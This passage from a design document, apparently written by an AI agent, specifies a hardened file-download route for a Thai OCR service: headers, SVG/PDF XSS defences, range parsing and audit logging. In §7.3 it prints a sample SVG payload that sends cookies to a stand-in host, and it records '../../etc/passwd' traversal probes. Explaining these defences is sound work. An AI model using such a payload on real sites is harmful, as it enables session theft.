const Params = z.object({ documentId: z.uuid(), objectId: z.uuid() });

async function loadAuthorisedObject(params: unknown) {
  const parsed = Params.safeParse(params);
  if (!parsed.success) return null;                       // -> the same 404, not a 400 or a 500
  const { documentId, objectId } = parsed.data;

  // AUTHORISE FIRST. Tenant scoping is a WHERE clause, not a filter on the result.
  const session = await requireSession();
  const row = await prisma.storageObject.findFirst({
    where: {
      id: objectId,
      documentId,
      deletedAt: null,
      document: { tenantId: session.tenantId, deletedAt: null },
    },
    select: { objectKey: true, mediaType: true, bytes: true, sha256: true,
              document: { select: { originalFilename: true } } },
  });
  if (!row) return null;

  // *** BigInt BOUNDARY. `row.bytes` is a `bigint` (Prisma maps BIGINT -> bigint). Every consumer
  // below does arithmetic with `number`, and JS throws
  //   TypeError: Cannot mix BigInt and other types, use explicit conversions
  // at RUNTIME -- verified on node v22.22.3. The first draft passed `object.bytes` straight into
  // parseRangeHeader(header, size: number), so EVERY ranged download (i.e. every PDF viewer
  // scrub and every resumed download) would have 500'd. Convert exactly once, here. ***
  return { ...row, bytes: Number(row.bytes) };
}

export async function GET(
  req: Request,
  { params }: { params: Promise<{ documentId: string; objectId: string }> },
) {
  const object = await loadAuthorisedObject(await params);
  // Same 404 for "does not exist", "not yours", and "malformed id": no oracle of any kind.
  if (!object) return new Response(null, { status: 404 });

  // The key comes from the DATABASE. The URL contributes only ids used in a WHERE clause.
  const key = assertSafeObjectKey(object.objectKey);

  const range = parseRangeHeader(req.headers.get('range'), object.bytes); // null | ByteRange | 'invalid'
  if (range === 'invalid') {
    return new Response(null, { status: 416, headers: { 'Content-Range': `bytes */${object.bytes}` } });
  }

  const handle = await storage.get(key, range ? { range } : undefined);
  // `after` is stable since Next 15.1 and, per the docs, "will be executed even if the response
  // didn't complete successfully" -- which is exactly the property the fd release needs, because
  // the failure case (client abort mid-stream) is the one that leaks descriptors.
  after(() => handle[Symbol.asyncDispose]());

  return new Response(handle.stream, {
    status: range ? 206 : 200,
    headers: downloadHeaders(object, range),
  });
}
```

### 7.1.1 The `HEAD` handler

§1.1 justifies putting `stat` in the port by "the download route must emit `Content-Length` /
`Last-Modified` / `ETag` and validate `Range` **without reading bytes**" — and then the first draft
never exported a `HEAD` handler, so that justification went unused. It matters: **Next.js
auto-implements `HEAD` by invoking `GET` and discarding the body**, which opens the file
descriptor, streams the entire object out of storage, and throws it away. For a 500 MB PDF that is
500 MB of pointless I/O (and, on S3, of egress billing) per `HEAD` — and download managers and
some PDF viewers send `HEAD` before every ranged `GET`.

```ts
export async function HEAD(
  _req: Request,
  { params }: { params: Promise<{ documentId: string; objectId: string }> },
) {
  const object = await loadAuthorisedObject(await params);
  if (!object) return new Response(null, { status: 404 });
  // stat only: HeadObject on S3 (one request, zero transfer) / fstat locally. No stream, no fd held.
  const st = await storage.stat(assertSafeObjectKey(object.objectKey));
  if (!st) return new Response(null, { status: 404 });
  return new Response(null, { status: 200, headers: downloadHeaders(object, null) });
}
```

The headers are byte-identical to `GET`'s, which is what RFC 9110 requires of a `HEAD` response and
what makes a subsequent ranged `GET` behave.

### 7.2 The headers, each with its reason

```ts
function downloadHeaders(o: ObjectRow, range: ByteRange | null): Headers {
  const h = new Headers();

  // (a) Content-Type from a CLOSED SERVER-SIDE ALLOWLIST keyed on the SNIFFED type stored at
  //     upload. Never from the client's request, never from the file extension.
  //     Anything not in the map degrades to octet-stream rather than guessing.
  h.set('Content-Type', SERVE_TYPE[o.mediaType] ?? 'application/octet-stream');

  // (b) Kill MIME sniffing. Without it, IE/Edge legacy and some crawlers will "helpfully"
  //     re-type an octet-stream that begins with "<html" as text/html and render it.
  h.set('X-Content-Type-Options', 'nosniff');

  // (c) Force download, never inline render. RFC 6266: `filename` is the ASCII fallback,
  //     `filename*` (RFC 5987) carries UTF-8. Thai filenames REQUIRE filename*.
  h.set('Content-Disposition', contentDisposition(o.document.originalFilename));

  // (d) CSP on the RESPONSE ITSELF. Defence in depth: even if (a) is wrong and the browser
  //     renders the body as HTML, `default-src 'none'` blocks every subresource and inline
  //     script, and `sandbox` (no allow-scripts, no allow-same-origin) puts it in an opaque
  //     origin with no access to cookies or the parent DOM.
  h.set('Content-Security-Policy', "default-src 'none'; sandbox; base-uri 'none'; form-action 'none'");

  // (e) Block cross-origin <img>/<script>/fetch embedding of tenant documents.
  h.set('Cross-Origin-Resource-Policy', 'same-origin');

  // (f) Documents contain PII. No shared-cache copies, no disk cache on a shared workstation.
  h.set('Cache-Control', 'private, no-store, max-age=0');

  // (g) Integrity + range support.
  h.set('ETag', `"${o.sha256}"`);        // our SHA-256, never the S3 ETag (§6.2 leak 4)
  h.set('Accept-Ranges', 'bytes');
  if (range) {
    h.set('Content-Range', `bytes ${range.start}-${range.end}/${o.bytes}`);
    h.set('Content-Length', String(range.end - range.start + 1));
  } else {
    h.set('Content-Length', String(o.bytes));
  }
  return h;
}

/** The serve-time allowlist. Deliberately NARROWER than the upload allowlist. */
const SERVE_TYPE = {
  'application/pdf':  'application/pdf',
  'image/png':        'image/png',
  'image/jpeg':       'image/jpeg',
  'image/tiff':       'image/tiff',
  'image/webp':       'image/webp',
  'text/plain':       'text/plain; charset=utf-8',   // charset is NOT optional -- see the Thai note
  'application/json': 'application/json',
} as const;
// NEVER present, at any layer, under any condition:
//   text/html, application/xhtml+xml, image/svg+xml, text/xml, application/xml,
//   application/javascript, text/javascript, application/xslt+xml
```

**Two `Content-Length` caveats on a streamed `Response`.** (a) Node's HTTP layer may switch a
streamed body to chunked transfer-encoding and drop the header; the value above is therefore a
best-effort hint on `200` and **mandatory correctness** on `206`, where a `Content-Range` /
`Content-Length` pair that disagrees with the bytes actually delivered produces a corrupt file in
the client with no error. (b) If the object is truncated or replaced between `stat` and the end of
the stream, the declared length is a lie. Both are closed the same way: the `206` length is
computed from the **range clamped against the size returned by the open file descriptor's
`fstat`** (`ReadHandle.stat`), not from the DB row, and the adapter aborts the stream if it reads
fewer bytes than promised. The DB `bytes` column is used for the `200` case and for `416`
validation only.

> **Thai encoding on the export path — a blind spot in the first draft.** Serving
> `text/plain` and `text/csv` back to Thai users is not solved by picking UTF-8; it is solved by
> saying so *in three places*, because Thailand has a live legacy encoding (TIS-620 /
> Windows-874, still emitted by older government systems and by Thai Excel):
>
> 1. **`charset=utf-8` in the `Content-Type` is mandatory, never omitted.** Without it browsers
>    fall back to a locale default, and a Thai Windows browser's default is **CP874**, which
>    renders UTF-8 Thai as mojibake. `nosniff` does not help: it prevents type sniffing, not
>    charset guessing.
> 2. **A UTF-8 BOM (`EF BB BF`) is written at the head of `kind=export` `.csv` and `.txt`
>    objects.** Microsoft Excel on Thai Windows opens a BOM-less UTF-8 CSV as CP874 and produces
>    unreadable Thai — the single most-reported "your OCR output is broken" bug for Thai
>    products, and it is not a bug in the OCR at all. The BOM makes Excel do the right thing.
>    Consequence to keep straight: the BOM is 3 bytes **inside the object**, so it is covered by
>    `sha256` and `bytes` like any other content, and any downstream parser we write must skip it.
>    JSON exports get **no** BOM (RFC 8259 forbids it and `JSON.parse` rejects it).
> 3. **Ingest is UTF-8-only.** If a TIS-620/CP874 source document is ever accepted, transcoding
>    happens once at ingest and the stored bytes are UTF-8; the storage layer never guesses an
>    encoding at read time. Detecting Thai legacy encodings is a document-processing concern
>    (dimension for the OCR pipeline), explicitly out of scope here — but it is named so it is not
>    silently assumed to be handled by storage.

**`Content-Disposition` is a header-injection surface.** The filename is user-supplied and Thai.

```ts
/** Hard cap on the stored display name, enforced at UPLOAD as well as here. See the Thai note. */
const FILENAME_MAX_CHARS = 120;

function contentDisposition(rawName: string | null): string {
  // NFC, not NFKC: NFKC would rewrite the user's ำ (U+0E33) into ํ + า (U+0E4D U+0E32) --
  // visually identical, different bytes, and not what they typed. Folding belongs in the derived
  // `filename_fold` search column (§3.3 attack 7 Defence 2), never in the name we hand back.
  // Normalise BEFORE measuring: NFC can change the length.
  const name = (rawName ?? 'document').normalize('NFC').slice(0, FILENAME_MAX_CHARS);

  // ASCII fallback: strip CR/LF (response splitting), quotes and backslash (parameter escape),
  // control chars, and every non-ASCII byte. Then guard the Windows device names (§3.3 attack 6)
  // -- this is where they genuinely bite, because the browser writes this to the user's disk.
  let ascii = name.replace(/[\r\n"\\]/g, '').replace(/[^\x20-\x7E]/g, '_').slice(0, 100).trim();
  if (ascii === '' || RESERVED_WIN.has(ascii.split('.', 1)[0]!.toLowerCase())) ascii = 'document';
  if (ascii.endsWith('.') || ascii.endsWith(' ')) ascii += '_';   // Windows strips these

  // UTF-8 form: RFC 5987 `charset'lang'pct-encoded`. encodeURIComponent leaves !'()* unescaped,
  // which are attr-char in RFC 5987 -- escape them so no separator survives.
  const utf8 = encodeURIComponent(name).replace(/['()!*]/g, (c) =>
    '%' + c.charCodeAt(0).toString(16).toUpperCase());

  return `attachment; filename="${ascii}"; filename*=UTF-8''${utf8}`;
}
// รายงาน.pdf ->
//   attachment; filename="_______.pdf"; filename*=UTF-8''%E0%B8%A3%E0%B8%B2%E0%B8%A2%E0%B8%87%E0%B8%B2%E0%B8%99.pdf
```

> **Thai header-size bomb — the reason `FILENAME_MAX_CHARS` exists.** The first draft capped the
> ASCII fallback at 100 characters but left `filename*` **completely unbounded**, and that is the
> parameter Thai actually uses. Do the arithmetic: a Thai codepoint is 3 bytes in UTF-8, and
> percent-encoding turns each byte into 3 characters, so **one Thai character costs 9 bytes of
> header** — a 30× expansion versus the 1 byte an unreserved ASCII character costs. A user who
> names a file with 1 000 Thai characters (trivially done by pasting a paragraph, and Thai has no
> inter-word spaces so a "word" can be arbitrarily long) produces a **~9 KB `Content-Disposition`
> header**. Typical reverse-proxy limits are 4–8 KB for a single header line (nginx
> `large_client_header_buffers` default 8 KB, and many CDNs are lower), so the download fails with
> a 502/431 **for Thai users only**, while every English test file passes. This is the exact shape
> of bug that ships to a Thai-primary market undetected.
>
> `FILENAME_MAX_CHARS = 120` bounds the worst case at 120 × 9 = 1 080 bytes plus the ASCII
> parameter — comfortably inside every limit. The same cap is enforced by Zod at upload so the DB
> column can never hold a name this function would have to truncate, and truncation is applied
> **after** NFC (normalisation can change the length) and to the *display* name only — the object
> key never contained it (§2.2).

*One more Thai detail:* slicing a Thai string at an arbitrary index can orphan a combining mark
(a tone mark whose base consonant was cut). It is harmless in the ASCII fallback (non-ASCII is
stripped anyway) and merely cosmetic in `filename*`, but if the cap is ever tightened, slice on a
grapheme boundary with `Intl.Segmenter('th', { granularity: 'grapheme' })` rather than on code
units.

Format verified against MDN: `Content-Disposition: attachment; filename="file name.jpg";
filename*=UTF-8''file%20name.jpg`
(<https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition>).
MDN also notes Safari historically does not decode percent-escapes — hence keeping both parameters.

### 7.3 Why an SVG upload is an XSS vector

SVG is **not an image format in the security sense — it is an XML document with a scripting
environment.** A valid `.svg` can contain:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://evil.tld/?c='+document.cookie)</script>
  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="..."/></body></foreignObject>
  <a xlink:href="javascript:alert(document.domain)"><text>click</text></a>
</svg>
```

The critical distinction:

| Context | Scripts run? |
|---|---|
| `<img src="x.svg">` | **No** — image context, scripting disabled |
| `<object>` / `<embed>` / `<iframe>` | Yes |
| **Direct navigation** — user opens the download link in a tab | **Yes, in *your* origin** |

That last row is the kill. If the file is served from `app.innovera-ocr.example` with
`Content-Type: image/svg+xml`, the script executes with full access to `document.cookie`, the
session, and every same-origin API — a complete account takeover from an "image upload".

**`X-Content-Type-Options: nosniff` does not help.** `nosniff` stops the browser *guessing* a type;
here the declared type is genuinely `image/svg+xml`. The header is correct and the attack still works.

**Four independent defences, in priority order:**

1. **Reject SVG at upload.** Content sniffing via `file-type@22.0.2` (magic bytes) is the gate;
   verified from its README, the library "is for detecting **binary**-based file formats, not
   text-based formats like `.txt`, `.csv`, `.svg`" and **does not detect SVG at all**. Since our
   `ALLOWED_MEDIA` map is a closed allowlist and SVG is not a key in it, an SVG produces
   `undefined` from the sniffer and is rejected before a key is ever minted. *SVG is not an OCR
   input format*, so there is no product cost. This is the real fix.
2. **`Content-Disposition: attachment`** on every response — never inline navigation for user content.
3. **`Content-Security-Policy: default-src 'none'; sandbox`** on the download response — `sandbox`
   without `allow-scripts` and without `allow-same-origin` neutralises the payload even if 1 and 2
   both fail.
4. **Separate origin (M2 hardening).** Serve all user content from a cookieless
   `files.innovera-ocr.example` on a distinct registrable domain. Then a successful XSS lands in an
   origin with no session, no cookies, and no same-origin API access. This is the only defence that
   is robust to an unknown future parser bug, and it is the standard the large providers use
   (`googleusercontent.com`, `githubusercontent.com`).

**The same reasoning applies to PDF**, which is our *primary* format and cannot be rejected. PDF
supports embedded JavaScript, and Chrome's built-in viewer executes a subset of it. Defences 2, 3,
and 4 all apply; additionally, if an in-app viewer is built, PDF.js must run in a sandboxed iframe
on the separate origin with its own scripting disabled, never inline on the main origin.

### 7.4 Range-request hardening

`Range` is attacker-controlled and reaches a `read(2)` offset.

```ts
function parseRangeHeader(header: string | null, size: number): ByteRange | null | 'invalid' {
  if (!header) return null;
  // Single range only. Multi-range ("bytes=0-1,2-3,...") requires multipart/byteranges and is a
  // known amplification DoS -- a few hundred ranges turn one request into a large response.
  const m = /^bytes=(\d*)-(\d*)$/.exec(header.trim());
  if (!m) return 'invalid';
  const [, s, e] = m;
  if (s === '' && e === '') return 'invalid';
  let start: number, end: number;
  if (s === '') { start = Math.max(0, size - Number(e)); end = size - 1; }   // suffix range
  else { start = Number(s); end = e === '' ? size - 1 : Number(e); }
  if (!Number.isSafeInteger(start) || !Number.isSafeInteger(end)) return 'invalid';
  if (start < 0 || end < start || start >= size) return 'invalid';           // -> 416
  return { start, end: Math.min(end, size - 1) };
}
```

The `\d*` regex (rather than `.+`) already rejects negative and non-numeric offsets before they
become a `Number`. The explicit `start >= size` check is what produces `416` instead of an empty
`200`, which some clients treat as a truncated file.

One subtlety worth stating because it looks like a bug: an empty suffix range (`bytes=-0`) parses
to `start = size, end = size - 1` and is caught by `end < start` → `416`, which is what RFC 9110
prescribes. And `Number('')` is `0`, not `NaN`, which is why the `s === '' && e === ''` guard is
needed *before* the numeric conversions rather than relying on `Number.isSafeInteger`.

### 7.5 Access logging — the PDPA obligation the first draft left out

A "secure OCR" product whose deletion design is explicitly justified by PDPA erasure (§5.3) needs
the other half of the same regime: **an auditable record of who read what.** Deletion accountability
without access accountability answers only half of a data-subject request.

Every successful `GET`/`HEAD` on this route appends one row (via `after()`, so it never blocks the
stream):

| Field | Notes |
|---|---|
| `tenant_id`, `actor_id`, `session_id` | Who |
| `storage_object_id`, `document_id`, `kind` | What. **Ids only — never the object key and never the filename.** |
| `bytes_served`, `range_start`, `range_end`, `status` | Whether the read completed or the client aborted mid-stream |
| `ip`, `user_agent`, `requested_at` | Standard request context |

Two rules that are easy to get wrong:

- **Never log the original filename or the object key.** The filename is user-controlled Thai text
  that can contain CR/LF and ANSI escapes; writing it into a line-oriented log is a log-injection
  and log-forging vector, and in a terminal-rendered log viewer an escape sequence is an active
  payload. Log the `storage_object_id` and join when a human actually needs the name. This is the
  same reasoning that keeps keys out of `StorageError.message` (§1.2).
- **The audit table is append-only** and is *not* purged by the erasure path in §5.3 — the record
  that an access occurred is itself a compliance artefact and outlives the object. Retention of the
  audit log is a separate, legally-driven decision (**UNVERIFIED**, same counsel dependency as the
  30-day grace).

---

## 8. Both AI-gateway branches

> **UNRESOLVED — nothing in this section may be read as a statement of fact about the gateway.**
> The AI gateway's **endpoint, model name, model list, and vision capability are all unknown** and
> cannot be established in this session. The orchestrator's exhaustive search found no LiteLLM,
> vLLM, or self-hosted model configuration on this workstation, and no `AI_BASE_URL` / `AI_MODEL` /
> `AI_API_KEY` in any readable file; I independently found nothing further, and I made no network
> calls to any production host (prohibited).
>
> **A correction to the first draft's framing:** it labelled these branches "Qwen is text-only" and
> "Qwen is vision-capable", which asserts the model's *identity* as though it were settled. It is
> not. The only "qwen" strings anywhere on this machine are Alibaba **public cloud** model aliases
> in an unrelated project's provider preset list — a different system entirely, and not evidence
> about the INNOVERA private stack. The branches are therefore restated in terms of the only
> property that changes the storage design: **whether the gateway accepts image input at all.**
> The model's name, vendor, and weights are irrelevant to every decision below and must be
> supplied by the owner before any code assumes them.

The storage design is specified for both branches, and **deliberately identical in the recommended
path**, so the unresolved question blocks nothing here.

### Branch A — the gateway is text-only

OCR runs entirely inside our trust boundary (EasyOCR/PaddleOCR/Tesseract in the worker container;
note `~/.EasyOCR/model/thai.pth` and `craft_mlt_25k.pth` already exist on this workstation per the
brief, indicating prior Thai OCR work — this is evidence about *local OCR experimentation*, not
about the gateway). Only **extracted text** reaches the LLM.

Storage impact:
- **Zero object egress.** No object ever leaves the storage boundary.
- `PresignCapable` is never implemented, never needed. §6.2 leak 2 is moot.
- `kind=page` images exist only as an OCR engine input and a UI preview source; both are internal.
- Simplest possible posture, and the strongest privacy story for a "secure OCR" product.

### Branch B — the gateway accepts image input

The gateway needs pixels. (Whether it does, and in what wire format, is **UNRESOLVED**.)

**B1 — inline base64 (RECOMMENDED).** Page images are read through `storage.get`, downscaled, and
embedded as `data:image/jpeg;base64,…` in the request body.
- **The storage port is unchanged from Branch A.** No presigning, no public exposure, no IAM, no
  URL-expiry semantics leaking into application code.
- Cost: base64 inflates payloads ~33%, so page derivatives must be bounded — proposal: long edge
  1536 px, JPEG q80, target < 1.5 MB/page, written as `kind=page`. That bound is a product
  parameter, not a storage one.
- The `page` derivative is needed for the UI preview anyway, so this adds no new object kind.

**B2 — short-TTL presigned URLs (rejected unless forced).** Only if the gateway cannot accept
inline image data.
- Requires implementing `PresignCapable`, which on **local disk does not exist** and would have to
  be faked with an HMAC-token route — reintroducing exactly the leak §6.2 item 2 was designed to
  prevent, and creating an unauthenticated (token-only) path to tenant documents.
- If forced: TTL ≤ 300 s, single-use nonce recorded in `idempotency_records`, gateway reachable only
  over a private network, URL never logged (presigned URLs in access logs are credentials).
- Gate it behind `isPresignCapable()` at the transport layer so no domain or application code ever
  learns that URLs exist.

**Decision: build for B1.** It makes storage branch-invariant, so the unresolved gateway question
does not block M1 storage work at all.
*What would change it:* the gateway rejecting request bodies above some size, or having no
data-URL support in its `image_url` content part. Both are answerable in one probe once the
endpoint is supplied.

---

## 9. Open questions

1. **AI gateway — UNRESOLVED, owner-supplied, blocks nothing in storage by design.** Endpoint,
   model **name**, model list, and image-input support are all unknown (§8). Storage proceeds on
   Branch B1 regardless. Do not let any downstream document assume a vendor or model.
2. **Max upload size.** `MAX_UPLOAD_BYTES = 500 MB` is assumed from the brief's phrasing. Needs a
   product decision; it now sets the disk preflight, the running write cap (§4.4), the quota
   reservation for undeclared-length uploads (§4.5), and the request-body limit.
3. **PDPA retention.** The 30-day grace on originals needs legal confirmation. Designed as a single
   constant so it is a one-line change. The **audit-log** retention period (§7.5) is a second,
   independent legal question with the same dependency.
4. ~~**Worker Python version.**~~ **RESOLVED** — pin 3.13 (3.12 acceptable). Not a judgement call:
   `boto3 1.43.90` and `python-ulid 4.0.1` both declare `requires_python >=3.10` (verified from
   PyPI), so 3.9.6 cannot install the dependency set at all. §1.3.
5. **Separate serving origin.** Registering a second domain for user content is an M2 item with a
   procurement dependency; §7.3 defence 4 is the strongest control and should not slip further.
6. **Cloudflare R2 parity.** If R2 becomes the target, a one-hour spike must check `Range`,
   multipart, **conditional writes (`If-None-Match: '*'`, which `ifAbsent` now depends on —
   §6.2 leak 9)**, and **full-object CRC checksum support (§6.2 leak 4)**. Note the first draft
   listed "`ChecksumAlgorithm: SHA256` parity" — that is no longer the thing to test, because we no
   longer use it.
7. **Antivirus / content scanning.** `quarantine/` exists in the layout but has **no producer and
   no scanner specified** — as written, nothing ever moves an object into it, so the directory is
   currently decorative. ClamAV on the upload path is the obvious candidate; not evaluated this
   session. Until a scanner exists, `quarantine/` should either be implemented or removed from
   §4.1 rather than implying a control that does not run.
8. **Decompression / render bombs.** A 100 KB PDF can rasterise to tens of gigabytes, and the
   `kind=page` derivative pipeline is what would try. Storage bounds the *stored* size but not the
   *rendered* size. Needs an explicit pixel budget (proposal: reject a page whose declared
   MediaBox × target DPI exceeds ~50 Mpx, and cap total pages) in the OCR-pipeline dimension.
   Named here because §4.4's disk-full analysis would otherwise be read as complete cover.
9. **Backfill throughput.** Still **UNVERIFIED** — depends on VPS egress bandwidth, which cannot be
   measured without contacting a production host (prohibited this session).

---

## 10. Evidence log

**Commands run on this workstation (2026-09-09):**
- `diskutil info /` → Macintosh HD, APFS.
- Python heredoc: NFC/NFD Thai `U+0E33` vs `U+0E4D U+0E32` → **not equal under NFC or NFD**;
  `os.stat("/tmp/a\x00b")` → `ValueError: embedded null byte`;
  `b"\xc0\xaf".decode("utf-8")` → `UnicodeDecodeError ... invalid start byte`; `python 3.9.6`.
- Python heredoc on a scratch dir: NFC-written file found under NFD; `open(NFD,'x')` →
  `FileExistsError`; `open('doc.pdf','x')` after `Doc.PDF` → `FileExistsError`; stored bytes NFC.
  → **APFS is case-insensitive and normalisation-insensitive, but normalisation-preserving.**
- `node probe.js` → `O_NOFOLLOW=256`, `O_EXCL=2048`, `O_DIRECTORY=1048576`;
  `path.resolve('/data/ocr-files','/etc/passwd')` → `/etc/passwd`;
  `path.join('/data/ocr-files','../../etc/passwd')` → `/etc/passwd`;
  NUL in path → `ERR_INVALID_ARG_VALUE`.
- `node probe2.js` → `fsp.statfs` present (`bsize=4096`); `Readable.toWeb`/`fromWeb`,
  `FileHandle.readableWebStream`/`createReadStream`/`sync`/`datasync` present; `stat().nlink`
  exposed; `node v22.22.3`.
- `ls -ld /data` → does not exist. `docker version` → server 29.5.2. `pnpm -v` → 11.18.0.
- `grep -ril` over `/Users/innovera/Documents/jawbong/process` and `/Users/innovera/Documents/TCL`
  for storage/minio/s3/presigned → only two incidental hits in jawbong phase plans, **no storage
  prior art to reuse.**

**Package versions (registry.npmjs.org / pypi.org, 2026-09-09):**
`@aws-sdk/client-s3 3.1128.0`, `@aws-sdk/s3-request-presigner 3.1128.0`,
`@aws-sdk/lib-storage 3.1128.0`, `ulidx 2.4.1`, `ulid 3.0.2`, `file-type 22.0.2`,
`nanoid 6.0.1`, `sanitize-filename 1.6.4`; `boto3 1.43.90`, `aioboto3 15.5.0`,
`aiofiles 25.1.0`, `python-ulid 4.0.1`, `python-magic 0.4.27`, `filetype 1.2.0`.

**GitHub API (2026-09-09):** `minio/minio` archived=True, AGPL-3.0, pushed 2026-04-24, last release
`RELEASE.2025-10-15T17-29-55Z`. `seaweedfs/seaweedfs` archived=False, Apache-2.0, pushed
2026-09-09, release `4.46` (2026-09-08). `deuxfleurs/garage` not present on GitHub.

**Documents fetched:**
- <https://docs.aws.amazon.com/AmazonS3/latest/userguide/optimizing-performance.html> — 3,500 write /
  5,500 read req/s per partitioned prefix; unlimited prefixes; gradual scaling with 503 Slow Down.
- <https://docs.aws.amazon.com/AmazonS3/latest/userguide/qfacts.html> — part size 5 MiB–5 GiB,
  10,000 parts, 48.8 TiB max object.
- <https://github.com/minio/minio> — "THIS REPOSITORY IS NO LONGER MAINTAINED", archived 2026-04-25.
- <https://raw.githubusercontent.com/sindresorhus/file-type/main/readme.md> — ESM-only;
  `fileTypeFromStream`/`fileTypeStream` exist; PDF/PNG/JPEG/TIFF detected; **SVG not supported**.
- <https://nodejs.org/api/fs.html> — `FileHandle.sync`/`datasync`/`createReadStream`; `fs.constants`
  open flags.
- <https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition> —
  RFC 5987 `filename*=UTF-8''…` syntax; Safari percent-escape caveat.

**Not done (constraint compliance):** no network contact with 72.62.253.185, 52.221.213.43,
141.98.17.91, or 187.52.117.52; no port scans; no package installs; no container lifecycle
commands; no writes outside `/Users/innovera/Documents/OCR` (scratchpad excepted); no `.env` reads.

### 10.1 Second-reviewer evidence (adversarial pass, 2026-09-09)

Everything below was re-executed or re-fetched independently of the first draft.

**Re-verified and CONFIRMED (first draft was right):**
- `minio/minio` → `archived: true`, `license.spdx_id: AGPL-3.0`, `pushed_at 2026-04-24T17:54:39Z`,
  `disabled: false`, 61 372 stars.
- `seaweedfs/seaweedfs` → `archived: false`, `Apache-2.0`, `pushed_at 2026-09-09T04:28:22Z`, 34 540 stars.
- S3 multipart limits page: **max object 48.8 TiB**, 10 000 parts, part size 5 MiB–5 GiB, 1000
  parts per list. (The 48.8 TiB figure looked like a derived-and-hallucinated number — 10 000 × 5 GiB —
  and was specifically re-checked. It is what AWS publishes.)
- npm `latest`, all exact: `@aws-sdk/client-s3` / `lib-storage` / `s3-request-presigner` **3.1128.0**
  (Apache-2.0), `ulidx` **2.4.1**, `ulid` **3.0.2**, `file-type` **22.0.2** (ESM-only), `nanoid` **6.0.1**.
- PyPI `latest`, all exact: `boto3` **1.43.90**, `aioboto3` **15.5.0**, `aiofiles` **25.1.0**,
  `python-ulid` **4.0.1**, `python-magic` **0.4.27**, `filetype` **1.2.0**.
- `file-type` readme: *"This package is for detecting binary-based file formats, not text-based
  formats like `.txt`, `.csv`, `.svg`"* — SVG genuinely undetected; PDF/PNG/JPEG/TIFF/WEBP detected.
- Node `v22.22.3`: `path.join('/data/ocr-files','../../etc/passwd')` → `/etc/passwd`;
  `path.resolve('/data/ocr-files','/etc/passwd')` → `/etc/passwd`; `O_NOFOLLOW=256`, `O_EXCL=2048`,
  `O_DIRECTORY=1048576`; `Symbol.asyncDispose` present.
- Docker server **29.5.2**.
- `after` is exported from `next/server`, **stable since v15.1.0**, and per the docs *"will be
  executed even if the response didn't complete successfully"* — which is the property the fd
  release depends on.

**New evidence that CHANGED a conclusion:**
- `unicodedata.decomposition('ำ')` → **`'<compat> 0E4D 0E32'`**, and
  `NFC False / NFD False / NFKC True / NFKD True` for `กำ` vs `ก`+`ํ`+`า`.
  → **NFKC/NFKD *do* unify Thai SARA AM.** §3.3 attack 7 rewritten.
  Thai combining classes also captured: SARA U/UU ccc=103, MAI EK–MAI CHATTAWA ccc=107, PHINTHU ccc=9.
- AWS checksum table: **SHA-256 supports COMPOSITE only for multipart; full-object checksums are
  CRC-only** — *"Full object checksums in multipart uploads are only available for CRC-based
  checksums… This type of validation isn't available for other algorithms, such as SHA and MD5."*
  → §6.2 leak 4 corrected; `ChecksumAlgorithm: 'SHA256'` removed from the design.
- `KEY_RE.test('a/../b') === true` and `'a/../b'.includes('//') === false` (node v22.22.3).
  → §3.2 step (4a) is **not** redundant; the first draft's "unreachable" comment was false.
- `re.match(r'…$', 'ab\n')` **matches** in Python but the JS equivalent does not.
  → Python validator must use `\Z` / `fullmatch` (§1.3.1).
- `typing.NewType('K', str)('../../etc/passwd')` returns the string unchanged.
  → Python has **no** runtime key validation; §1.3.1 added.
- `100n - Number('5')` → `TypeError: Cannot mix BigInt and other types`.
  → the Prisma `BigInt` → `parseRangeHeader(size: number)` path in §7.1 was a live 500.
- PyPI metadata: `boto3 1.43.90` and `python-ulid 4.0.1` declare `requires_python >=3.10`.
  → the worker Python version moves from "open question" to "determined by dependencies".
- AWS conditional-writes doc: `If-None-Match: '*'` on `PutObject` → 412 on conflict, SigV4 required.
  → gives `ifAbsent` a real S3 implementation (§6.2 leak 9).

**Checked and found NOT to be established by the cited evidence:**
- The GitHub API response for `minio/minio` contains **no `archived_at` field**, so the first
  draft's "Archived 25 April 2026" was an inference from `pushed_at`. The archive *date* is
  UNVERIFIED; the archived *state* is verified and is all the decision needs.

---

## Critic Notes

Adversarial review pass, 2026-09-09. The draft was strong — its verified-vs-`UNVERIFIED` discipline
held up under independent re-checking, and every package version, every OS probe, and the MinIO and
SeaweedFS repository states were confirmed exactly as stated. The findings below are what survived
that check. Nothing was removed from the document; everything here is a correction, a deepening, or
a filled gap.

### Factual errors corrected

1. **§6.2 leak 4 — `ChecksumAlgorithm: 'SHA256'` does not do what the draft said.** For any
   multipart upload (anything over the 16 MiB `partSize`, i.e. most scanned PDFs) S3 stores a
   *composite* `sha256(concat(part_sha256s))-N`, because full-object checksums are CRC-only. The
   draft therefore recommended, one layer up, the exact `ETag` mistake the same section warns
   against — and §6.3's migration verifier would have false-mismatched on every large object.
   Replaced with: our streaming SHA-256 stays canonical, carried on S3 as `x-amz-meta-sha256`;
   S3-side integrity uses `CRC32C` + `ChecksumType: FULL_OBJECT`.
2. **§3.2 step (4a) claimed the traversal check was "unreachable given (2)+(3)".** False, and
   verified false: `KEY_RE.test('a/../b')` is `true`. The anchors bind the whole string, not each
   segment. That comment actively invited a future refactor to delete the *only* real traversal
   defence. Rewritten with the verification inline, plus a CI regression test that fails if anyone
   re-derives the claim.
3. **§2.1 vs §2.3 — ULID/UUID contradiction.** The key spec said 26-char ULIDs for
   `tenantId`/`documentId`; the Prisma model said `@db.Uuid`. Both cannot hold, and the key-length
   arithmetic, `SEG_MAX`, and the shard input all depend on the answer. Resolved in a new §2.0
   (UUIDv7 for PKs, ULID for per-object ids) with the rejected alternative and reversal trigger;
   §2.1's arithmetic recomputed (120 chars, 126 max).
4. **§7.1 — Prisma `BigInt` fed into `number` arithmetic.** `object.bytes` is a `bigint`;
   `parseRangeHeader(header, size: number)` does `size - Number(e)`, which throws
   `TypeError: Cannot mix BigInt and other types` at runtime. Every ranged download — every PDF
   scrub, every resumed download — would have 500'd. Converted once at the repository boundary,
   with the rule stated in §1.2 and §2.3.
5. **§6.1 — "Archived 25 April 2026" was inferred from `pushed_at`,** which is a different event;
   the API returns no `archived_at`. Narrowed to what the evidence supports.
6. **§1.1 — `copy` and `put` omitted load-bearing S3 ceilings:** `CopyObject` is capped at 5 GiB
   (above which `UploadPartCopy` is required), and a single `PutObject` is capped at 5 GB, which is
